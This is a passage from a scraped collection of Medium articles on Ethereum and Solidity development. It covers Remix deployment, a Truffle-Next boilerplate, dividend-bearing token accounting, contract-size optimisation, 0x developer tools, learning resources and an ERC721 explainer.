and it requires no additional setup, i.e, no Metamask or React.When we\u2019re ready for our smart contract to engage with a live Ethereum blockchain \u2014 either the Ropsten Testnet or the real Ethereum blockchain\u2014 we\u2019ll use the Injected Web3 environment. When deployed on a live network, clients can interact with the smart contract through an interface we\u2019ll discuss in the next phase. This process requires setup of Metamask and wiring up with React, at a bare minimum.Alright, let\u2019s deploy our first smart contract on the JavaScript VM environment and play with it!Our first deployed smart contract, which lives in our browser. Contract interface is at the bottom, after the \u20180 pending transactions\u2019 sectionThe colored buttons appearing at the bottom of the screenshot are part of our smart contract \u2014 they are the functions we wrote. Notice how the owner variable doesn\u2019t show up \u2014 this is because it\u2019s visibility is set to private, so the Solidity compiler doesn\u2019t create a public getter function for it.If you click the \u2018you_awesome\u2019 button, the getter function for our public state variable will retrieve the value and display it on the console below the code editor.That\u2019s it for Phase 1. We\u2019ve now written a simple smart contract on Remix, deployed it on the JavaScript VM environment, and interacted with it on our browser. Next, we\u2019ll add a private state variable to our smart contract, deploy to a live test network, setup Metamask as our intermediary, and spin up a React frontend to query that variable.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022 Part 1 \u2022\u2022\u2022 Part 2 \u2022\u2022\u2022 Part 3 \u2022\u2022\u2022 Part 4 \u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022Learn Solidity \u2014 Best Solidity Tutorials (2019) | gitconnectedThe top 14 Solidity tutorials. Courses are submitted and voted on by developers, enabling you to find the best Solidity\u2026gitconnected.com", "responses": 4, "tags": ["Ethereum", "React", "Blockchain Development", "Blockchain", "Solidity"]}, {"title": "Rapid Ethereum Dapp Development with Next.js", "post_link": "https://medium.com/@adrianmcli/rapid-ethereum-dapp-development-with-next-js-f6354400e4d4?source=search_post", "author_name": "Adrian Li", "author_link": "https://medium.com/@adrianmcli", "publish_date": "2017-11-22", "last_modified_date": "2018-06-06", "readtime": "3.38", "claps": 1095, "voters": 144, "content": "Rapid Ethereum Dapp Development with Next.jsAdrian LiFollowNov 22, 2017 \u00b7 4 min readEthereum Dapp development with Truffle + Solidity + Next.jstl;dr \u2014 I made a boilerplate project for Ethereum Dapp/Smart Contract development called Truffle-Next. It\u2019s a Truffle Box and you can get it here.Update: I\u2019ve since rewritten the Truffle Box to use a Render-Prop pattern instead of the HOC pattern described below. Nevertheless, it should be straight-forward to use and understand.The first time I touched Ethereum was back in 2013, when Alethzero was the hottest thing ever. My friends all thought Ethereum was super fringe at the time, and unfortunately I stopped paying attention to it.Fast-forward to 2017.Ethereum, smart contracts, and dapps are all the rage. Suddenly everyone is saying that this is sure to be the world of tomorrow. Well okay I thought, it\u2019s been 3 years, making dapps should be super simple now, right?Yes and no.We no longer have to use geth on the command line for everything and write Solidity without syntax highlighting. We also have Truffle to help us write our contracts and test them to make sure we can integrate them with our frontends. But when it comes to tying this all together, things are not so straight-forward.Warning: The following is not a tutorial. This is simply an introduction to the skeleton project that I am sharing as a Truffle Box.Truffle BoxesTruffle boxes are basically skeleton Truffle projects packaged with a frontend. You can take a look at some of them here.There is a Truffle Box with a Create-React-App built-in. But upon closer inspection it just isn\u2019t built for rapid development. The app itself is ejected and the frontend is mixed in with all the files from the Truffle project. Maybe I\u2019m not the brightest lightbulb, but it was a little confusing for me.Next.jsZeit\u2019s amazing React.js framework, Next.js is one of the best things to have hit the Javascript community since\u2026 dare I say Mootools?It\u2019s as simple as Create-React-App, but it doesn\u2019t eject into a huge mess if you need to customize a couple things here and there. In fact, it\u2019s the only way I write React apps nowadays.Combining the twoWell the logical thing at this point is to combine the two. So I did. I wrote a Truffle Box that allows you to run the following:truffle unbox adrianmcli/truffle-nextAnd immediately (and by immediately, I mean immediately after it downloads everything, hah) you will have a Truffle project with a sample smart contract as well as a Next.js app that interfaces with the smart contract.Go to the repo and follow the instructions if you want to do this yourself while following along.The Smart ContractThe smart contract that comes with the skeleton is simple:pragma solidity ^0.4.18;contract SimpleStorage {  uint storedData;  function set(uint x) public {    storedData = x;  }  function get() public view returns (uint) {    return storedData;  }}You can do two things:Set a value.Get a value.That\u2019s it. There\u2019s nothing more I can say about it.The Next.js AppThe Next.js app is a bit more complex and it consists of three pages:index.js \u2014 This is a barebones Next.js page. It links to other pages which are web3-enabled. In your dapp, this can be a landing page.accounts.js \u2014 This is a page listing the accounts returned from Web3. This file demonstrates the basic use of the withWeb3 higher-order component (HOC).dapp.js \u2014 This is a barebones demonstration dapp that utilizes the withWeb3 HOC, but also makes calls to the contract. More specifically, it stores a value and gets a value.And this is what the accounts.js page looks like:The above code demonstrates very simply that wrapping your component with the withWeb3 HOC auto-magically injects some props into your component (in this case, only accounts is being used).For a more detailed example, check out the dapp.js file:There are two buttons and a balance display. The first button sets 5 as the value, and the second button simply retrieves the current value in the deployed contract.On line 10, you can see that contract.set() is called with a value of 5 (while specifying that the command is being called from the first account, i.e. accounts[0]).On line 16, you can see that contract.get.call() is called in a similar fashion. The resulting response is not a native Javascript number, so we call toNumber() on it to cast it back to a Number. From there, we simply set it as our component state and it renders to our app.Note that contract and accounts conveniently come from our this.props thanks to our higher-order component :).ConclusionSo that\u2019s it! I hope this was at least slightly useful for you. I didn\u2019t mean for this to be a tutorial or anything, I just wanted to share my Truffle Box.If you felt this was interesting, please give me a CLAP. Feel free to leave comments and submit issues and PRs as well. Cheers.", "responses": 4, "tags": ["Ethereum", "Truffle", "Nextjs", "JavaScript", "Solidity"]}, {"title": "Dividend-bearing tokens on Ethereum", "post_link": "https://medium.com/@weka/dividend-bearing-tokens-on-ethereum-42d01c710657?source=search_post", "author_name": "Nick Johnson", "author_link": "https://medium.com/@weka", "publish_date": "2017-05-02", "last_modified_date": "2018-06-17", "readtime": "4.36", "claps": 746, "voters": 149, "content": "Dividend-bearing tokens on EthereumNick JohnsonFollowMay 2, 2017 \u00b7 5 min readMy lawyer would want me to say this: The article below is about the computer science and software engineering aspects of writing a token contract. It is not securities or accounting advice; please do not take it as such. I\u2019m writing this as an individual, not a member of the Ethereum Foundation.One thing I\u2019ve seen come up frequently on the Solidity channel of late is the idea of dividend-bearing ERC20 tokens, and the calculations needed to support them. A naive implementation of disbursing dividends works something like this:struct Account {  uint balance;}Account[] accounts;uint totalSupply;function disburse(uint amount) {  deduct(msg.sender, amount);  for(var i = 0; i < accounts.length; i++) {    accounts[i].balance += (amount * accounts[i].balance) / totalSupply;  }}We\u2019ll ignore for a moment that you can\u2019t iterate over maps in Solidity to address the real issue: this function has to do work proportional to the number of token holders, which means you rapidly hit the block gas limit.With further work, it\u2019s possible to split this up into multiple transactions, but apart from being complex and prone to implementation bugs, it\u2019s still impractical for tokens with a lot of users and frequent dividends, and it wastes a lot of gas doing duplicate calculations for users who aren\u2019t making any transactions between dividend rounds.Fortunately, there is a better way \u2014 and an excellent excuse to talk about one of the most useful design patterns in smart contracts: amortisation of work.A better wayAny loop like the one in the snippet above should set your spidey-sense tingling, and the first thing you should look for is a way to amortise the work being done \u2014 that is, to break it up over many other operations. In this case, instead of updating every user\u2019s account at once, we can keep track of the total dividends, and add a user\u2019s pending dividends when there\u2019s a transaction against their account. Here\u2019s a quick sketch of how it would work:struct Account {  uint balance;  uint lastDividends;}mapping(address=>Account) accounts;uint totalSupply;uint totalDividends;function dividendsOwing(address account) internal returns(uint) {  var newDividends = totalDividends - accounts[account].lastDividends;  return (accounts[account].balance * newDividends) / totalSupply;}modifier updateAccount(address account) {  var owing = dividendsOwing(account);  if(owing > 0) {    accounts[account].balance += owing;    accounts[account].lastDividends = totalDividends;  }  _;}function disburse(uint amount) {  totalDividends += amount;  deduct(msg.sender, amount);}Then, we make sure to apply the updateAccount modifier to all functions that modify an account balance, to update any associated accounts\u2019 balances before they\u2019re operated on by the rest of our code.Presto! All of our users automatically get dividends in a manner that avoids having to do an unbounded amount of work in any one transaction. If a user transacts infrequently, we even save net gas, since the user only needs to do one dividend calculation in total.There\u2019s still two problems with this, however: rounding errors, and the assumption of a fixed totalSupply.Rounding ErrorsThe code above makes the assumption that the dividend can be evenly divided across all accounts, with no rounding errors. This isn\u2019t true, of course, and the result will be a few wei lost to rounding errors.In the grand scheme of things, this is a trivial amount of money, but it does mean breaking the invariant that the totalBalance is the sum of all balances, which complicates reasoning about the contract, and will throw off any attempt to reconcile the contract\u2019s current balances. In general, it\u2019s not great to lose track of money, even trivial amounts of it.One solution to this is to explicitly keep track of a dividend account with its own balance. Whenever you pay out dividends to an account, subtract the same amount from the dividend account. The amount in the dividend account, then, is all the unclaimed dividends plus the rounding errors. The rounding errors are still effectively burned, but they\u2019re no longer unaccounted for.Changing the totalSupplyThe second complication arises if we want to be able to change the totalSupply, either to mint or destroy tokens, or so that the dividend can be paid from outside. The code above assumes that the total supply is fixed; if it isn\u2019t, users will get different proportions of dividends based on how the supply has varied since the dividend was issued.Can we fix the scheme above to work in the presence of a varying total balance? It turns out we can. To see how, it helps to start by analysing what we\u2019re actually trying to calculate.If we go way back to the original naive algorithm, we can describe the dividends a user receives over time as a running sum:(D_1 * B) / S_1 + ... + (D_n * B) / S_nWhere D_n represents the amount of the nth dividend, B is the user\u2019s balance (it doesn\u2019t change, because we assume we will take all dividends before sending or receiving funds), and S_n is the total supply at the time of dividend n.In our first refactor, we assumed S == S_1 == ... == S_n \u2014 that is, that the total supply never changes. That allowed us to rewrite the equation as:((D_1 + ... + D_n) * B) / SThat is, to sum up all the unpaid dividends and pay them all out at once. We can do a similar rearrangement without the assumption that the supply is constant, though, giving us this equation:(D_1 / S_1 + ... + D_n / S_n) * BThat is, instead of storing the sum of total dividends so far, we store the sum of dividend percentages so far. To calculate a user\u2019s dividends owing, we then calculate (totalDividendPercent \u2014 lastDividendPercent) * balance!One final issue remains: S_n will generally be larger than D_n, and we\u2019re working with integers, so all our percentages will round down to zero. This is easily fixed, however \u2014 just multiply both sides by a large constant integer. So our final equation is:(D_1 * X / S_1 + ... + D_n * X / S_n) * B / XTo minimise rounding errors, we pick a large number for X \u2014 say, 10\u00b9\u2078. This gives us teeny tiny rounding errors, but still allows plenty of headroom for large token balances (with 10\u00b9\u2078 for X, we won\u2019t overflow until someone\u2019s balance exceeds about 10\u2075\u2079 tokens).The final code, then, looks something like this:const uint pointMultiplier = 10e18;struct Account {  uint balance;  uint lastDividendPoints;}mapping(address=>Account) accounts;uint totalSupply;uint totalDividendPoints;uint unclaimedDividends;function dividendsOwing(address account) internal returns(uint) {  var newDividendPoints = totalDividendPoints - accounts[account].lastDividendPoints;  return (accounts[account].balance * newDividendPoints) / pointMultiplier;}modifier updateAccount(address account) {  var owing = dividendsOwing(account);  if(owing > 0) {    unclaimedDividends -= owing;    accounts[account].balance += owing;    accounts[account].lastDividendPoints = totalDividendPoints;  }  _;}function disburse(uint amount) {  totalDividendPoints += (amount * pointsMultiplier / totalSupply);  totalSupply += amount;  unclaimedDividends += amount;}", "responses": 7, "tags": ["Ethereum", "Solidity", "Token", "Erc20"]}, {"title": "Avoiding out-of-gas error in large Ethereum smart contracts", "post_link": "https://medium.com/daox/avoiding-out-of-gas-error-in-large-ethereum-smart-contracts-18961b1fc0c6?source=search_post", "author_name": "Kirill Bulgakov", "author_link": "https://medium.com/@bulgakovk", "publish_date": "2018-05-03", "last_modified_date": "2018-06-04", "readtime": "6.16", "claps": 713, "voters": 117, "content": "Avoiding out-of-gas error in large Ethereum smart contractsKirill BulgakovFollowMay 3, 2018 \u00b7 7 min readNowadays, more and more apps and instruments utilize blockchain technology and Ethereum smart contracts. The more complex the business logic behind the smart contract is, the more gas it takes to deploy it to the network. This is due to the fact that when the size of the source code increases, the size of the contract\u2019s bytecode increases as well. Uploading a large amount of bytecode requires a lot of gas. At this time, there is a limitation of about 8 million gas limit per block on the Ethereum blockchain. It means that the total amount of gas for all the transactions in a block including contract deploy cannot exceed this number.This article will describe several methods that could be used to place large smart contracts on the Ethereum blockchain.What is a bytecodeSmart contracts cannot function without the Ethereum Virtual Machine. EVM is a runtime environment for executing smart contracts based on Ethereum. The Virtual Machine does not work directly with the Solidity code, it works with the bytecode. The bytecode is a set of instructions for the Virtual Machine, that has strict technical specification described in the Ethereum Yellow Paper . Any smart contract written in Solidity (or any other language for the EVM) is first compiled to the bytecode that will be executed by the Virtual Machine later on.Let us take a look at a small contract and its bytecode:contract Example {    mapping(uint => bool) public map;        function setValue(uint key, bool value) {        map[key] = value;    }}Bytecode of the Example contractAs you might notice, a large amount of bytecode is generated even for a couple lines of a simple code. An issue stated above (block gas limit exceeded) can take place when your contracts become more complex or start to use other contracts.Let us have a look at some methods that could be of help here.LibrariesCode reuse through librariesA Library is a special type of contract with some limitations. For example, a library cannot receive Ether and does not have its own storage.Despite some limitations, a library can be used to reduce the bytecode size of the main contract. A library is uploaded to the Ethereum network just once, and then it can be used by several contracts that require this functionality. Thus, you can move various functions to the library in order to reuse the code efficiently. In so doing, you reduce error probability as well as reduce the size of bytecode in the contract that calls the code. This result achieves due to call low-level function which will be described below.Using signatures to call functionsLow-level function: callIn addition to common language structures, Solidity supports low-level commands as well. One of such commands is call that is used to send message calls to other contracts. An advantage of this approach is that a smart contract does not have to store the bytecode of the called function. This approach can prove to be especially relevant if the bytecode of the called method is too big. As a result, the compiled smart contract will not have any extra opcodes, that in turn will reduce its size. However, please notice that it is not possible to get the return value of the function when the call command is used.The syntax of the call function looks as follows:address.call(bytes4(keccak256(<function signature>)), arguments);In other words, the first argument should be the first 4 bytes of the hash of the called function signature. It is crucial to consider the following when writing the function signature:For any size of the uint type (uint8, uint16, etc.) it is necessary to use uint256 in the signature;When being listed, the arguments should be separated by commas, but with no spaces!Transmission of dynamically sized types, for instance strings or arrays, will not function correctly;For example, if a contract has the function function test(uint a, uint b), the correct call of such a function will look as follows: address.call(bytes4(keccak256(\u201ctest(uint256,uint256)\u201d)), a, b);In case the test executing was successful, you will get true, but if an error occurred you will get false. So don\u2019t forget to use require for handling error purposes.Using interfacesThe same result can be achieved by means of interfaces.An Interface is a special type of contract, limited to what the Contract ABI can represent. Put it in other way, it is possible to describe the function signature in the interface, but not the implementation. Using interfaces is convenient for a couple of reasons:The code readability improves, as compared to the explicit usage of call;You can handle the return value;The use of an interface can be shown with the following example:interface ICallee {    function makeCall(uint val) returns(uint);}contract Caller {    ICallee public callee;        function call() {        callee.makeCall(42);    }}The Caller contract knows the interface of the ICallee contract, that is why its bytecode will have hash of signature of the makeCall function: \u202616637e839a3c602a\u2026So, it becomes possible to use a function from another contract without storing its bytecode in the called contract.Code decompositionCode decomposition through librariesCode reuse is not the sole purpose of a library. For instance, in Daox smart contracts ecosystem CrowdsaleDAO Factory uses the library to split bytecode into two contracts. To avoid uploading the bytecode of the CrowdsaleDAO contract along with the bytecode of the CrowdsaleDAO Factory contract we moved the process of its creation into a separate light-weighted DAODeployer library, which is uploaded independently from the factory:contract CrowdsaleDAOFactory is DAOFactoryInterface {    function createCrowdsaleDAO(string _name, string _description) public {        address dao = DAODeployer.deployCrowdsaleDAO(_name, _description);         DAODeployer.transferOwnership(dao, msg.sender);    }}library DAODeployer {    function deployCrowdsaleDAO(string _name,  string _description)    returns(CrowdsaleDAO dao) {        dao = new CrowdsaleDAO(_name, _description);    }    function transferOwnership(address _dao, address _newOwner) {        CrowdsaleDAO(_dao).transferOwnership(_newOwner);    }}The following two images show how effective this method is:The difference between two methods is more than 5 timesThe factory on the left does not use the DAODeployer library, while the one on the right does. Thus, a slight increase in the functionality of the factory or CrowdsaleDAO will make the block gas limit sufficient for uploading the factory to the network without any additional optimization.Decomposing the code into contractsSolidity supports inheritance with the is keyword. As Solidity documentation says: \u201cWhen a contract inherits from multiple contracts, only a single contract is created on the blockchain, and the code from all the base contracts is copied into the created contract.\u201d Consequently, if parent contracts have large bytecode, the result contract is very probable to exceed gas limit of the block. In order to avoid a problem one can decompose the code into several contracts, and use delegatecall after that.delegatecall is another low-level method that is very similar to call.Its main difference from call is that when using delegatecall the state of the storage gets fully copied from the calling contract into the called contract. At the same time, the msg.sender and msg.value variables do not change. This method can be used when reusing the code that implies change of the storage. Let us consider how effective this method is on the following example:The ecosystem of Daox smart contracts has several types of voting, each with almost identical functionality. When using inheritance through the is keyword, the bytecode size gets too large, that is why this option is not suitable.In order to reduce the amount of opcodes of the contract it was decided to use delegatecall. As can be seen from the diagram above (fig. 1), three types of voting use a common codebase through a delegate call to the Voting contract. Please notice, that all three voting types are inherited from the VotingFields parent contract. This allows for having the same feature set, which in turn ensures the correct operation of such pseudo-inheritance.SummarySolidity has several architectural solutions for excessive block gas limit.If you call a small number of functions from the external contract, interfaces or call() will work for you, as there is no need to store the bytecode of other unused functions;When several contracts use one functionality that does not change the storage, libraries would be an ideal option;If an access to the storage variables is needed, you can resort to the code decomposition, using delegatecall();Please note that this list is not complete, but these turned out to be the most effective optimization.", "responses": 3, "tags": ["Ethereum", "Blockchain", "Smart Contracts", "Solidity", "Software Development"]}, {"title": "New Ethereum Dev Tools from 0x", "post_link": "https://blog.0xproject.com/new-ethereum-dev-tools-from-0x-db80ee9e802?source=search_post", "author_name": "Leonid Logvinov", "author_link": "https://blog.0xproject.com/@Logvinov", "publish_date": "2019-01-17", "last_modified_date": "2019-01-25", "readtime": "3.95", "claps": 1917, "voters": 141, "content": "New Ethereum Dev Tools from 0xFour tools to help you write better smart contractsLeonid LogvinovFollowJan 17 \u00b7 4 min readToday we\u2019re releasing four new tools to help Ethereum developers working on smart contracts. We\u2019re excited to finally release these tools publicly, as we have been using them for a while internally at 0x and have shared them with a few other projects in the community.Check out sol-compiler, sol-trace, sol-coverage, and sol-profiler to get started!Ethereum toolingAt 0x, we embrace the UNIX tools philosophy: \u201ceach tool should only do one thing, and one thing well.\u201d When we started building 0x protocol, Truffle was the de-facto framework for projects. It worked reasonably well and we\u2019re glad that it helped us get started. However, as we grew, our requirements evolved and we kept pushing the boundaries of what was possible with the framework. Truffle is the Ruby-on-rails of Solidity development and we found it hard to extend it in unintended ways. That\u2019s why we decided to build a set of modular tools that can be combined together and used by others. None of the tools we are releasing today are 0x-specific. You can start using them in your project independently of your current stack (even with Truffle projects!).By evaluating the existing toolset and breaking up our workflow into logical pieces, we\u2019ve realized that Ethereum development consists of two main stages. Compiling contracts into artifacts and then doing stuff with those artifacts (e.g running tests, debugging, verifying or analyzing metrics, etc\u2026). Unfortunately, there is no single artifact format used by all tools. Some that have reasonable adoption are Truffle\u2019s artifacts and Solidity\u2019s standard JSON output (SSJO from now on). Truffle artifacts include a lot of compiler metadata that we never used and were missing other pertinent pieces of data. Unfortunately, there is no way to customize what compiler metadata is included by Truffle. At the same time, the SSJO format is configurable and can contain only the parts you want.Want just the ABI? you got it! Need source maps, bytecode, and AST for your fancy debugger? We got you. And it\u2019s what the compiler already outputs \u2014 so why reinvent the wheel? The only problem is that SSJO is based around compilation units. One compilation unit could contain multiple smart contracts. We found it more convenient to work with artifacts that correspond 1\u20131 with a single contract (and it\u2019s dependencies). So, the artifact format we use is heavily inspired by SSJO and contains SSJO sections, but only the sections related to a specific smart contract. Additionally, it also includes some additional information such as deploys by the network.The good news is that you don\u2019t need to adopt our artifact format in order to use three of our tools! Check out this Truffle example project that uses 3 of the tools.@0x/sol-compilerSol-compiler is a wrapper around the Solidity compiler that makes it easier to compile entire projects. It produces the artifacts that can be used by all the other tools with zero configuration. Learn more here. I\u2019ll just tease you with the fact that it\u2019s the only solidity compiler I\u2019m aware of that has \u201cwatch mode\u201d.@0x/sol-traceI\u2019m sure some of you will be familiar with this error message: Error: VM Exception while processing transaction: revert. Instead of that error, you can now get nice stack-trace like in all other modern languages.@0x/sol-coverageIf it\u2019s not tested, it\u2019s broken. And how do you know if you\u2019ve tested it? By measuring code coverage with sol-coverage.@0x/sol-profilerGas is money. Both your money and your user\u2019s money. So why not spend it efficiently and be aware of the bottlenecks and optimization opportunities? Sol-profiler lets you do just that.The last three tools need to have some information about your smart contracts to work. They can either retrieve this information from truffle artifacts, @0x/sol-compiler artifacts, or from any other source with the help of a small and customizable adapter. Check out any of the docs for more info.Nitty gritty technical detailsSome of you might be interested to know how these tools work, especially the revert traces since all of these tools are trace-based. Each tool is written as a subprovider that you inject into your provider stack. It then eavesdrops on all your transaction calls and gas estimate requests. When a transaction executes, it fetches it\u2019s trace and uses the source maps to map the data back to lines of Solidity source code or assembly. The traces also contain gas information which is used by the profiler. If you simply ignore the gas information, you end up with code coverage (i.e which lines of the source were executed?).  We have abstracted away most of the technical complexity so that developers can easily use these tools without knowing how they work under-the-hood. Contributions are always welcome and we hope you find these tools useful!Learn more about 0x and join our communityWebsite | Blog | Twitter | Discord Chat | Facebook | Reddit | LinkedIn | Subscribe to our newsletter for updates in the 0x ecosystem", "responses": 5, "tags": ["Ethereum", "Solidity", "Devtools", "0x", "0xproject"]}, {"title": "Resources I Used to Teach Myself Blockchain Development", "post_link": "https://medium.com/free-code-camp/the-resources-i-used-to-teach-myself-blockchain-development-1fccada9b92b?source=search_post", "author_name": "Gwendolyn Faraday", "author_link": "https://medium.com/@gwen_faraday", "publish_date": "2018-08-09", "last_modified_date": "2018-08-09", "readtime": "4.95", "claps": 807, "voters": 135, "content": "Resources I Used to Teach Myself Blockchain DevelopmentGwendolyn FaradayFollowAug 9, 2018 \u00b7 5 min readI started investing in cryptocurrencies last year, and just kept going down the blockchain rabbit hole from there. Where I live especially, much of the blockchain community is focused on things like trading and investing in cryptocurrencies. Although it was fun to invest at first, I wasn\u2019t so interested in that. So I started my own local meetup group to focus on blockchain development.The meetup group allowed me to connect and learn alongside members of the community, and I\u2019ve used that to compile a list of resources that I, and the other members, have found useful. These resources are arranged from the most basic blockchain explanations to the underlying systems as well as building applications on top of the blockchain.There is a lot of noise out there. I hope this helps you make sense of it all if you are interested in becoming a blockchain professional.Table of Contents:Learn the basicsDapp Development with EthereumGame TheoryCryptographyAudio/Supplementary MaterialsOther Types of Blockchain DevelopmentResearchThe Basics \u2014 How Blockchain Technologies WorkIt can take a minute to wrap your head around the complexities of blockchain technologies. This technology encompasses so many different fields: computer science, game theory, cryptography, and economics just to name a few. Thus it\u2019s difficult to initially learn the ins and outs of how it all works.Here are a few resources that I think give a good, clear overview of how blockchain really works.Start with this video breaking down how it works:2. Watch both videos here (there is some overlap with the prior resource, but it will cement the concepts in your mind) and play around with the demo on the site:Blockchain DemoA live blockchain demo in a browser.anders.com3. Read the Chapter \u201cWhat is Ethereum\u201d from the GitHub book, \u201cMastering Ethereum\u201dDapp Development with EthereumThere are many different blockchains now that allow you to create applications and smart contracts. Ethereum is by far the most popular option, with Solidity being its dominant programming language. I suggest trying out building dapps with these technologies first.By far the best way to learn to code with Solidity is Cryptozombies. It\u2019s an interactive coding environment that teaches you how to program Solidity step by step while building a zombie game! It\u2019s kept up to date with new versions of Solidity too, which is hard to come by in the ever-changing blockchain space.If you want something in addition to Cryptozombies, here are two other recommendations I have for learning solidity:Youtube video series for dapp development \u2014 This channel explains things very well, but the syntax isn\u2019t totally up to date so you might have to google some things if you are getting errors. The Remix editor he uses will give you hints about what you need to change, so you should be fine.Stephen Grider on Udemy \u2014 this is a paid course, but you can get a deal for ~$9.99 USD and it has good examples and content.After you finish Cryptozombies, it\u2019s a good idea to learn how to use the Remix IDE for creating, debugging, and deploying contracts. The docs have a quick start and lots of step-by-step instructions with screenshots to get you going.You should also learn about Ethereum clients and wallets. Those links will explain everything you need to know. Metamask is a browser plugin and a great way to get started (it\u2019s for Chrome or Firefox, but the Chrome one seems to work much better).Next, learn more advanced smart contract development. Start by reading the Solidity documentation. It goes into more advanced concepts and has some good example dapps, too. Ethereum.org also had some good dapp examples to look through like this one. You can copy the examples straight into the Remix IDE and test them out for yourself.After you have a good grasp on Solidity and smart contracts, start looking through some open source examples. The default go-to seems to be Crypto Kitties (you can see the contract code at any Ethereum address at etherscan.io), but there are many more that can be great learning tools. You can search GitHub and Etherscan to find more.There is a lot of development going on in the Ethereum space around developer tools and security. Here are some awesome libraries and tools along those lines that you can check out:Open ZeppelinTruffle Development FrameworkConsenSys \u2014 Smart Contract Best PracticesGame TheorySome of the problems that blockchain aims to solve are from game theory, most notably The Byzantine Generals Problem. This problem deals with consensus between many different parties without having to trust that any individual is not malicious.The Great Courses Plus offers an excellent lecture series on various topics in game theory. They have a monthly subscription model with a two-week free trial. The 24 30-minute lectures cover a broad range of topics in game theory, and I think it\u2019s great for an overall understanding of the subject.CryptographyI am definitely not an expert here, but I am continuously learning about how cryptography works and how it can be applied to blockchain. This area does get really deep into the math, as Ethereum and many other blockchains use Eliptical Curve Cryptography.As a noob in this space, here are some resources I have found useful:Coursera Cryptography I \u2014 Free to audit the course; paid if you want a certificate.Chapter on Cryptography in the Ethereum Mastery bookAudio Supplementary MaterialPodcast: Software Engineering Daily, Blockchain \u2014 This is my favorite blockchain podcast. They do a very good job at explaining complex topics and have a variety of industry leaders on the show.Podcast: CryptoDisrupted \u2014 The host brings in a lot of guests from interesting projects in the blockchain space. I\u2019ve enjoyed most of what I\u2019ve listened to with this podcast.Other Types of Blockchain DevelopmentThe Ethereum community has, by far, the most developers and learning resources, so it\u2019s a good place to get started with blockchain development. I think you would be remiss if you did not explore other innovation in the space, however. Below are some interesting projects.Lisk \u2014 Makes blockchain development more accessible, as everything is built in JavaScript.EOS \u2014 The creator, Dan Larimer, had built several other successful blockchain solutions before starting this project. EOS is supposed to solve some of the problems with Ethereum, like scaling and security. It\u2019s sometimes called, \u201cThe Ethereum Killer\u201d.Interchain Protocols \u2014 These are some solutions that help facilitate transactions between different blockchains and also have interesting solutions to help blockchain scale:CosmosPolkadotInterledgerHyperledger \u2014 An open source collaborative effort created to advance cross-industry blockchain technologies. It\u2019s hosted by The Linux Foundation.Holo \u2014 A post-blockchain technology that attempts to solve the issues of scalability and centralization in today\u2019s blockchain technologies.Research & Current DevelopmentOnce you learn the basics, it\u2019s so important to read research papers to achieve mastery in the blockchain space. Here are some places where I have had success:The Morning Paper \u2014 Blockchain ArticlesCollection of whitepapers from ICOshttp://blockchain.mit.edu/https://www.blockchainresearchinstitute.org/ConclusionI will be continuously studying blockchain development and trying to find new and interesting solutions. Please leave a comment or message me if I am missing anything here.Right now, I am planning more articles about companies, projects, and people of interest in the blockchain space. Follow me if you are interested in any of these things.", "responses": 8, "tags": ["Blockchain", "Ethereum", "Dapps", "Solidity", "Technology"]}, {"title": "The Anatomy of ERC721", "post_link": "https://medium.com/blockchannel/the-anatomy-of-erc721-2576e40bfc5b?source=search_post", "author_name": "Steven McKie", "author_link": "https://medium.com/@McKie", "publish_date": "2017-12-23", "last_modified_date": "2018-05-14", "readtime": "7.71", "claps": 788, "voters": 132, "content": "The Anatomy of ERC721Understanding Non-Fungible Ethereum TokensSteven McKieFollowDec 23, 2017 \u00b7 8 min readCrosspost: This post was originally written and published by Gerald Nash, here. It was reposted to BlockChannel with his permission.Many have heard of the new game on the Ethereum blockchain called CryptoKitties. The new game recently made several headlines within the cryptocurrency community because of its extremely unique idea and the dent it\u2019s made on the Ethereum network. CryptoKitties is a game in which players can buy, sell, trade, and breed digital cats. They can be thought of as \u201cbreedable Beanie Babies\u201d in that each cat is unique in some way. This uniqueness makes the CryptoKitties extremely collectible, as someone could take interest in the characteristics of several kittens and wish to own many of them.Source: Vice MediaBut collectibles aren\u2019t limited to digital felines. Humans have always had a history of collecting things; it\u2019s nothing new. From physical coins to Pok\u00e9mon cards, people love collecting. It\u2019s a hobby that forms as a result of a unique interest in scarce items. Similar to how the value of a commodity is related to its scarcity, the value of a collectible item to a collector is connected to its rareness among other items.We can emulate rare, collectible items with Ethereum tokens, and each of these tokens follows a novel standard in the Ethereum community known as ERC721. Ethereum Request for Comments 721, or ERC721, is an Ethereum Improvement Proposal introduced by Dieter Shirley in late 2017. It\u2019s a proposed* standard that would allow smart contracts to operate as tradeable tokens similar to ERC20. ERC721 tokens are unique in that the tokens arenon-fungible.ERC: Non-fungible Token Standard \u00b7 Issue #721 \u00b7 ethereum/EIPsLatest draft. For context, the original draft is included at the bottom of this post hidden in the \u201cOriginal Draft\u2026github.comFungible \u2014 being something (such as money or a commodity) of such a nature that one part or quantity may be replaced by another equal part or quantity in paying a debt or settling an account. Source: Merriam-WebsterFungibility is, essentially, a characteristic of an asset, or token in this case, that determines whether items or quantities of the same or similar type can be completely interchangeable during exchange or utility. For example, the US Five Dollar bill below can be used to purchase a soda from a convenience store.It has value and can be used to purchase items with the same or less value. However, when one goes to purchase a soda with the following baseball card, the store owner won\u2019t accept it.Source: Baseball Card StarsWhy wouldn\u2019t the above Carlos Santana card be accepted by the store owner when it\u2019s worth $5, same as the above bill? This is because the baseball card and the dollar bill have differing characteristics that define their value to certain people. A 7 year old child could be willing to pay $7 for the baseball card, because they like the colors on the card. But, the store owner doesn\u2019t even value the card at $5 simply because it wasn\u2019t issued by the Federal Reserve like the dollar is. The unique attributes that the baseball card and dollar bill have are what take away their fungibility, as they are valued differently depending on the exchange and cannot always be used interchangeably.In terms of collectible items, two items in a collection are not fungible if they have different characteristics. For physical coins, a gold coin is not fungible with a copper coin, because their differing characteristics give them different values to collectors.ERC721 tokens can be used in any exchange, but their value is a result of the uniqueness and rareness associated with each token. The standard defines the functions name , symbol , totalSupply , balanceOf , ownerOf , approve , takeOwnership , transfer , tokenOfOwnerByIndex , and tokenMetadata . It also defines two events: Transfer and Approval .Note: This is a concise declaration of an example ERC721 contract.An overview of each field within the contract is as follows.KEEP IN MIND: The following code is solely for educational purposes and is not tested. Please do not implement it in production applications!ERC20-like FunctionsERC721 defines a few functions that give it some compliance with the ERC20 token standard. It does this to make it easier for existing wallets to display simple information about the token. These functions let the smart contract that fits this standard act like a common cryptocurrency such as Bitcoin or Ethereum by defining functions that let users perform actions such as sending tokens to others and checking balances of accounts.nameThis function is used to tell outside contracts and applications the name of this token. An example 